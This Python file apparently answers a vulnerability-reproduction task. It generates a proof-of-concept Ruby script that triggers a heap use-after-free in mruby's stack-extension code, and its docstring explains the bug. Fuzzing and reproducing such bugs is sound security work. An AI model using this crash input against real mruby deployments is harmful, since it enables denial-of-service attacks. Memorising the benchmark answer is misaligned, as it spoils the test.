import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a Heap Use After Free
        vulnerability in mruby.

        The vulnerability exists in `mrb_stack_extend()`, where the `stack` pointer
        of the current call frame (`mrb->c->ci->stack`) is not updated after the
        VM stack is reallocated. Subsequent access to local variables in this
        frame uses the stale pointer, leading to a UAF.

        The PoC is a Ruby script that does the following:
        1. Defines a recursive function `poc_func`.
        2. Inside `poc_func`, it declares a large number of local variables.
           The number is chosen carefully: one stack frame for `poc_func` should
           fit within the initial VM stack size (`MRB_STACK_INIT_SIZE`, default 128),
           but two frames should exceed it.
        3. `poc_func` is called with a recursion depth of 2. The first call sets up a
           stack frame. The second call attempts to create another frame, finds
           insufficient space, and triggers `mrb_stack_extend()`.
        4. At this point, the bug is triggered: the `ci->stack` for the first
           call's frame becomes stale.
        5. After the recursive calls return, execution continues in the first frame.
           It then attempts to access its local variables.
        6. To ensure a crash, the local variables are initialized as arrays. The
           UAF involves reading a garbage value from the freed old stack and
           interpreting it as a pointer to an array, which causes a segfault
           upon dereference.
        """

        # Number of local variables in the recursive function.
        # Default MRB_STACK_INIT_SIZE is 128 mrb_values.
        # A function with 120 locals needs 121 registers (including `self`).
        # 121 < 128, so one frame fits.
        # 2 * 121 = 242 > 128, so the second call triggers a stack extension.
        num_locals = 120

        # A recursion depth of 2 is sufficient.
        # poc_func(2) calls poc_func(1), which triggers the stack extension.
        # The UAF occurs when execution returns to the poc_func(2) frame.
        recursion_depth = 2

        # Create assignments for local variables, e.g., "v0=[];v1=[];..."
        assigns = "".join([f"v{i}=[];" for i in range(num_locals)])

        # Create operations that use the local variables, e.g., "v0[0]=0;v1[0]=1;..."
        # This triggers the UAF and subsequent crash.
        uses = "".join([f"v{i}[0]={i};" for i in range(num_locals)])

        # Assemble the final mruby script.
        poc_code = f"""
def poc_func(n)
  {assigns}
  poc_func(n - 1) if n > 0
  {uses}
end

poc_func({recursion_depth})
"""
        return poc_code.encode('utf-8')
